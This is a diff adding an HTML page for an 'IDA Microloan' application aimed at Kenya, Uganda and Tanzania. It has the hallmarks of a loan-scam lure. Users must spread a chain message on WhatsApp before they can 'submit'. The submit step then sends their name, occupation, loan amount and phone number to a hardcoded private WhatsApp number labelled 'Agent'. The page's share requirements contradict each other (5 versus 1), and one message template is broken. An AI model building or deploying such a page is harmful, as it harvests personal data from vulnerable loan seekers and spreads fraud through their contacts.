@@ -1,1 +1,206 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>IDA Loan - Select Your Country</title>
+  <style>
+    :root{--bg:#f4f7fb;--card:#fff;--accent:#0b63d6;--muted:#6b7280}
+    body{font-family:Inter,system-ui,Segoe UI,Roboto,Arial,sans-serif;background:var(--bg);margin:0;color:#0f172a}
+    .container{max-width:980px;margin:40px auto;padding:20px}
+    .hero{background:linear-gradient(90deg,#ffffffcc, #eaf2ff);border-radius:12px;padding:28px;box-shadow:0 6px 18px rgba(12,38,66,0.06)}
+    h1{margin:0 0 8px;font-size:22px}
+    p.lead{margin:0;color:var(--muted)}
+    .countries{display:flex;gap:16px;margin-top:20px}
+    .country{flex:1;background:var(--card);padding:18px;border-radius:10px;text-align:center;cursor:pointer;border:1px solid transparent;transition:all .18s}
+    .country:hover{transform:translateY(-4px);box-shadow:0 8px 24px rgba(12,38,66,0.06);border-color:rgba(11,99,214,0.12)}
+    .country img{width:56px;height:38px;object-fit:cover;border-radius:6px}
+    .country h3{margin:12px 0 6px;font-size:16px}
+    .note{margin-top:18px;color:var(--muted);font-size:14px}
 
+    /* modal */
+    .modal-backdrop{position:fixed;inset:0;background:rgba(2,6,23,0.45);display:none;align-items:center;justify-content:center;padding:20px}
+    .modal{background:var(--card);width:100%;max-width:520px;border-radius:10px;padding:20px;box-shadow:0 20px 40px rgba(7,16,45,0.2)}
+    .modal h2{margin:0 0 8px}
+    .modal .sub{color:var(--muted);font-size:13px;margin-bottom:14px}
+    .field{display:flex;flex-direction:column;margin-bottom:12px}
+    label{font-size:13px;margin-bottom:6px}
+    input[type=text], input[type=tel], input[type=number], select{padding:10px;border:1px solid #e6eefc;border-radius:8px;font-size:14px}
+    .row{display:flex;gap:10px}
+    .btn{display:inline-block;padding:10px 14px;border-radius:8px;text-decoration:none;border:0;background:var(--accent);color:white;cursor:pointer}
+    .btn.ghost{background:transparent;color:var(--accent);border:1px solid rgba(11,99,214,0.12)}
+    .share-panel{margin-top:12px;padding:12px;border-radius:8px;background:#f8fbff;border:1px dashed rgba(11,99,214,0.08)}
+    .counter{font-weight:600}
+    .small{font-size:13px;color:var(--muted)}
+    footer{margin-top:30px;text-align:center;color:var(--muted);font-size:13px}
+    @media (max-width:640px){.countries{flex-direction:column}}
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="hero">
+      <h1>IDA Microloan Application</h1>
+      <p class="lead">Select your country to begin a short application. After filling the form click <strong>Apply</strong> — you'll be asked to share this opportunity on WhatsApp to at least 5 people. Once you've shared, you'll be able to submit your application via WhatsApp.</p>
+
+      <div class="countries">
+        <div class="country" data-country="Kenya" data-currency="KES">
+          <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='280' height='160'><rect width='280' height='160' fill='%23fff'/><text x='50%' y='50%' dominant-baseline='middle' text-anchor='middle' font-size='20' fill='%230b63d6'>KEN</text></svg>" alt="Kenya flag">
+          <h3>Kenya</h3>
+          <div class="small">Currency: KES</div>
+        </div>
+
+        <div class="country" data-country="Uganda" data-currency="UGX">
+          <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='280' height='160'><rect width='280' height='160' fill='%23fff'/><text x='50%' y='50%' dominant-baseline='middle' text-anchor='middle' font-size='20' fill='%230b63d6'>UGA</text></svg>" alt="Uganda flag">
+          <h3>Uganda</h3>
+          <div class="small">Currency: UGX</div>
+        </div>
+
+        <div class="country" data-country="Tanzania" data-currency="TZS">
+          <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='280' height='160'><rect width='280' height='160' fill='%23fff'/><text x='50%' y='50%' dominant-baseline='middle' text-anchor='middle' font-size='20' fill='%230b63d6'>TZA</text></svg>" alt="Tanzania flag">
+          <h3>Tanzania</h3>
+          <div class="small">Currency: TZS</div>
+        </div>
+      </div>
+
+      <div class="note">Note: This is a demo flow. WhatsApp sharing must be performed by the user — this page counts share button clicks as a proxy and requires at least <strong>5</strong> shares before allowing final submit.</div>
+    </div>
+
+    <footer>Fill the form, share and submit via WhatsApp</footer>
+  </div>
+
+  <!-- Modal -->
+  <div id="modalBackdrop" class="modal-backdrop" role="dialog" aria-hidden="true">
+    <div class="modal" role="document">
+      <button id="closeModal" class="btn ghost" style="float:right">Close</button>
+      <h2 id="modalTitle">Apply for loan</h2>
+      <div class="sub" id="modalSub">Country: <span id="selectedCountry">-</span> • Currency: <span id="selectedCurrency">-</span></div>
+
+      <form id="loanForm" onsubmit="return false;">
+        <div class="field"><label for="fullName">FULL NAME</label><input id="fullName" name="fullName" type="text" placeholder="e.g. Jane Doe" required></div>
+        <div class="field"><label for="occupation">OCCUPATION</label><input id="occupation" name="occupation" type="text" placeholder="e.g. Farmer, Tailor" required></div>
+        <div class="field"><label for="amount">AMOUNT APPLYING FOR (<span id="currencyLabel">KES</span>)</label><input id="amount" name="amount" type="number" min="1" placeholder="e.g. 50000" required></div>
+        <div class="field"><label for="phone">PHONE NUMBER</label><input id="phone" name="phone" type="tel" placeholder="+2547XXXXXXXX" pattern="\+?[0-9\s-]{7,20}" required></div>
+
+        <div style="display:flex;gap:8px;align-items:center;margin-top:8px">
+          <button id="applyBtn" class="btn" type="button">Apply (Share first)</button>
+          <button id="submitBtn" class="btn" type="button" disabled>Submit via WhatsApp</button>
+          <button id="cancelBtn" class="btn ghost" type="button">Cancel</button>
+        </div>
+
+        <div id="shareSection" class="share-panel" style="display:none">
+          <div class="small">To help spread the opportunity, please share this application with at least <strong>1</strong> different people on WhatsApp. Each time you click <strong>Share on WhatsApp</strong> it will open WhatsApp Web or the WhatsApp app. After 5 shares the submit button will be enabled.</div>
+          <div style="margin-top:10px;display:flex;gap:8px;align-items:center">
+            <button id="shareBtn" class="btn ghost" type="button">Share on WhatsApp</button>
+            <div class="small">Shared: <span id="shareCount" class="counter">0</span>/1</div>
+            <div style="margin-left:auto" class="small">You must share to at least 5 people.</div>
+          </div>
+        </div>
+
+      </form>
+    </div>
+  </div>
+
+  <script>
+    (function(){
+      const countries = document.querySelectorAll('.country');
+      const modal = document.getElementById('modalBackdrop');
+      const selectedCountryEl = document.getElementById('selectedCountry');
+      const selectedCurrencyEl = document.getElementById('selectedCurrency');
+      const currencyLabel = document.getElementById('currencyLabel');
+      const closeModal = document.getElementById('closeModal');
+      const cancelBtn = document.getElementById('cancelBtn');
+      const applyBtn = document.getElementById('applyBtn');
+      const submitBtn = document.getElementById('submitBtn');
+      const shareBtn = document.getElementById('shareBtn');
+      const shareSection = document.getElementById('shareSection');
+      const shareCountEl = document.getElementById('shareCount');
+      const fullName = document.getElementById('fullName');
+      const occupation = document.getElementById('occupation');
+      const amount = document.getElementById('amount');
+      const phone = document.getElementById('phone');
+
+      let activeCountry = null;
+      let activeCurrency = null;
+      // track shares in-memory for this application modal. You can persist per session if desired.
+      let shareCount = 0;
+
+      function openModal(country, currency){
+        activeCountry = country;
+        activeCurrency = currency;
+        selectedCountryEl.textContent = country;
+        selectedCurrencyEl.textContent = currency;
+        currencyLabel.textContent = currency;
+        shareCount = 0;
+        shareCountEl.textContent = shareCount;
+        shareSection.style.display = 'none';
+        submitBtn.disabled = true;
+        modal.style.display = 'flex';
+        modal.setAttribute('aria-hidden','false');
+      }
+
+      function close(){
+        modal.style.display = 'none';
+        modal.setAttribute('aria-hidden','true');
+      }
+
+      countries.forEach(c=>{
+        c.addEventListener('click', ()=>{
+          const country = c.dataset.country;
+          const currency = c.dataset.currency;
+          openModal(country,currency);
+        });
+      });
+
+      closeModal.addEventListener('click', close);
+      cancelBtn.addEventListener('click', close);
+
+      // When user clicks Apply: validate fields, then show share section
+      applyBtn.addEventListener('click', ()=>{
+        // quick validation
+        if(!fullName.value.trim() || !occupation.value.trim() || !amount.value || !phone.value.trim()){
+          alert('Please fill all fields before applying.');
+          return;
+        }
+        // show share panel
+        shareSection.style.display = 'block';
+        // focus share button
+        shareBtn.focus();
+        alert('Please share this application on WhatsApp to at least 5 different people. Each click opens WhatsApp.');
+      });
+
+      // Each click opens WhatsApp with pre-filled message.
+// User must forward it to at least 5 people manually inside WhatsApp.
+shareBtn.addEventListener('click', ()=> {
+  const shareText = `🚀 IDA Microloan Opportunity!\n\nApply now for fast, easy loans in ${activeCountry}.\n\n👉 Click here to start your application: ${location.href}\n\nPlease share this message with at least 5 friends so they can also apply!`;
+  const url = 'https://wa.me/?text=' + encodeURIComponent(shareText);
+
+  // open WhatsApp Web / App
+  window.open(url, '_blank');
+
+  shareCount += 1;
+  shareCountEl.textContent = shareCount;
+
+  if (shareCount >= 1) {
+    submitBtn.disabled = false;
+    alert('✅ Great! You can now submit your application via WhatsApp.');
+  } else {
+    alert(`Please share with at least ${ - shareCount} more people to unlock submission.`);
+  }
+});
+// Handle submit via WhatsApp
+// Handle submit via WhatsApp
+submitBtn.addEventListener('click', ()=> {
+  const message = `Hello Agent, I have submitted my loan application.\n\nDetails:\n- Name: ${fullName.value}\n- Occupation: ${occupation.value}\n- Amount: ${amount.value} ${activeCurrency}\n- Phone: ${phone.value}\n- Country: ${activeCountry}`;
+
+  const agentNumber = "254713422858";  
+
+  // Alternative API (sometimes faster on mobile/desktop)
+  const url = `https://api.whatsapp.com/send?phone=${agentNumber}&text=${encodeURIComponent(message.trim())}`;
+  window.open(url, '_blank');
+});
+
+
+    })();
+  </script>
+</body>
+  </html>
